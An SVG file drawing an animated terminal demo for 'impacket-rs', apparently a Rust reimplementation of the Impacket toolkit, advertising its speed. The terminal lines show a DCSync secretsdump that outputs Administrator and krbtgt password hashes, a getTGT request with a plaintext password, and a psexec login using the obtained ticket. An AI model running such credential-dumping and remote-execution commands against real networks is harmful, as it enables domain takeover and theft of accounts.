<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 850 490" width="100%" height="490">
  <defs>
    <linearGradient id="bg-grad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0d1117"/>
      <stop offset="100%" stop-color="#161b22"/>
    </linearGradient>
    <linearGradient id="bar-grad" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" stop-color="#238636"/>
      <stop offset="100%" stop-color="#2ea043"/>
    </linearGradient>
  </defs>

  <style>
    .terminal-bg { fill: url(#bg-grad); rx: 10px; stroke: #30363d; stroke-width: 1.5; }
    .header-bar { fill: #161b22; rx: 10px; }
    .btn-close { fill: #ff5f56; }
    .btn-min { fill: #ffbd2e; }
    .btn-max { fill: #27c93f; }
    .title-text { fill: #8b949e; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; font-weight: 600; }
    
    .term-text {
      font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
      font-size: 13px;
      line-height: 1.5;
    }
    .c-prompt { fill: #58a6ff; font-weight: bold; }
    .c-cmd { fill: #f0f6fc; }
    .c-info { fill: #79c0ff; }
    .c-success { fill: #3fb950; font-weight: bold; }
    .c-warn { fill: #d29922; }
    .c-purple { fill: #d2a8ff; }
    .c-gray { fill: #8b949e; }
    .c-hash { fill: #e3b341; font-family: ui-monospace, monospace; }

    /* Keyframe animation for terminal output steps (14s cycle) */
    @keyframes lineFade {
      0% { opacity: 0; transform: translateY(4px); }
      1.5%, 93% { opacity: 1; transform: translateY(0); }
      96%, 100% { opacity: 0; transform: translateY(-2px); }
    }

    @keyframes cursorBlink {
      0%, 49% { opacity: 1; }
      50%, 100% { opacity: 0; }
    }

    .cursor { animation: cursorBlink 0.8s infinite; fill: #58a6ff; }

    /* Sequenced step visibility */
    .step-1 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 0.2s; opacity: 0; }
    .step-2 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 0.8s; opacity: 0; }
    .step-3 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 1.3s; opacity: 0; }
    .step-4 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 1.8s; opacity: 0; }
    .step-5 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 2.3s; opacity: 0; }
    .step-6 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 2.8s; opacity: 0; }
    .step-7 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 3.5s; opacity: 0; }
    .step-8 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 4.2s; opacity: 0; }
    .step-9 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 5.0s; opacity: 0; }
    .step-10 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 5.8s; opacity: 0; }
    .step-11 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 6.5s; opacity: 0; }
    .step-12 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 7.2s; opacity: 0; }
    .step-13 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 8.0s; opacity: 0; }
    .step-14 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 8.7s; opacity: 0; }
    .step-15 { animation: lineFade 14s cubic-bezier(0.16, 1, 0.3, 1) infinite; animation-delay: 9.4s; opacity: 0; }
  </style>

  <!-- Terminal Window Chrome -->
  <rect width="850" height="490" class="terminal-bg" />
  <path d="M 0 10 C 0 4.477 4.477 0 10 0 L 840 0 C 845.523 0 850 4.477 850 10 L 850 38 L 0 38 Z" class="header-bar" />
  <line x1="0" y1="38" x2="850" y2="38" stroke="#30363d" stroke-width="1" />

  <!-- Mac Window Dots -->
  <circle cx="20" cy="19" r="6" class="btn-close" />
  <circle cx="40" cy="19" r="6" class="btn-min" />
  <circle cx="60" cy="19" r="6" class="btn-max" />

  <!-- Window Title -->
  <text x="425" y="23" text-anchor="middle" class="title-text">impacket-rs (v0.1.0) — High-Performance Protocol Engine</text>

  <!-- Terminal Body Content -->
  <g class="term-text">
    <!-- Command 1: secretsdump DCSync -->
    <g class="step-1">
      <text x="25" y="68" class="c-prompt">nestho@box<tspan fill="#8b949e">:</tspan><tspan fill="#d2a8ff">~</tspan><tspan fill="#8b949e">$</tspan></text>
      <text x="140" y="68" class="c-cmd">impacket-rs secretsdump corp.local/Administrator@10.0.0.1 -just-dc</text>
    </g>

    <g class="step-2">
      <text x="25" y="93" class="c-info">[*] Connected to DRSUAPI RPC interface at 10.0.0.1:445 (Negotiated: SMB 3.1.1 + AES-128-GCM)</text>
    </g>

    <g class="step-3">
      <text x="25" y="115" class="c-info">[*] Target: CORP.LOCAL (Forest Root, AD Compatibility Mode: Modern Hardened Win2025)</text>
    </g>

    <g class="step-4">
      <text x="25" y="137" class="c-gray">[*] DCSync streaming via MS-DRSR IDL_DRSGetNCChanges (Zero-Copy NDR)...</text>
    </g>

    <g class="step-5">
      <text x="25" y="159" class="c-success">[+]</text>
      <text x="50" y="159" class="c-cmd">Administrator:500:aad3b435b51404eeaad3b435b51404ee:<tspan class="c-hash">2b576acbe6bcfda7294d6bd18041b8fe</tspan>:::</text>
    </g>

    <g class="step-6">
      <text x="25" y="181" class="c-success">[+]</text>
      <text x="50" y="181" class="c-cmd">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<tspan class="c-hash">f7a29e8401cb95a34d28e7bb481a53cf</tspan>:::</text>
    </g>

    <g class="step-7">
      <text x="25" y="203" class="c-warn">[✓] Dumped 2,500 domain accounts in 18.2ms </text>
      <text x="360" y="203" class="c-purple">(Python Impacket: ~2,540ms — 139x Faster)</text>
    </g>

    <!-- Command 2: bench-ndr -->
    <g class="step-8">
      <text x="25" y="235" class="c-prompt">nestho@box<tspan fill="#8b949e">:</tspan><tspan fill="#d2a8ff">~</tspan><tspan fill="#8b949e">$</tspan></text>
      <text x="140" y="235" class="c-cmd">impacket-rs bench-ndr 1000000</text>
    </g>

    <g class="step-9">
      <text x="25" y="260" class="c-info">[*] Benchmarking pure-Rust compile-time NDR serialization (1,000,000 iterations)...</text>
    </g>

    <g class="step-10">
      <text x="25" y="282" class="c-success">[+] 1,000,000 roundtrips completed in 171.02 ms</text>
      <text x="390" y="282" class="c-purple">[5,847,150 ops/sec | 171.0 ns/op]</text>
    </g>

    <!-- Command 3: getTGT with FAST Armor & PKINIT -->
    <g class="step-11">
      <text x="25" y="314" class="c-prompt">nestho@box<tspan fill="#8b949e">:</tspan><tspan fill="#d2a8ff">~</tspan><tspan fill="#8b949e">$</tspan></text>
      <text x="140" y="314" class="c-cmd">impacket-rs getTGT corp.local/jdoe:Pass123! -dc-ip 10.0.0.1</text>
    </g>

    <g class="step-12">
      <text x="25" y="339" class="c-info">[*] Requesting TGT from KDC 10.0.0.1:88 (RFC 4120 + RFC 6113 FAST Armor)...</text>
    </g>

    <g class="step-13">
      <text x="25" y="361" class="c-gray">[*] Received AS-REP (e-type 18: AES256-CTS-HMAC-SHA1-96, PAC Checksum verified)</text>
    </g>

    <g class="step-14">
      <text x="25" y="383" class="c-success">[+] Saved Kerberos TGT to jdoe.ccache (Elapsed: 1.8ms | Cold Start: 1.8ms)</text>
    </g>

    <!-- Command 4: Active prompt -->
    <g class="step-15">
      <text x="25" y="420" class="c-prompt">nestho@box<tspan fill="#8b949e">:</tspan><tspan fill="#d2a8ff">~</tspan><tspan fill="#8b949e">$</tspan></text>
      <text x="140" y="420" class="c-cmd">impacket-rs psexec corp.local/Administrator@10.0.0.1 -k -no-pass</text>
      <rect x="660" y="407" width="8" height="15" class="cursor" />
    </g>
  </g>
</svg>
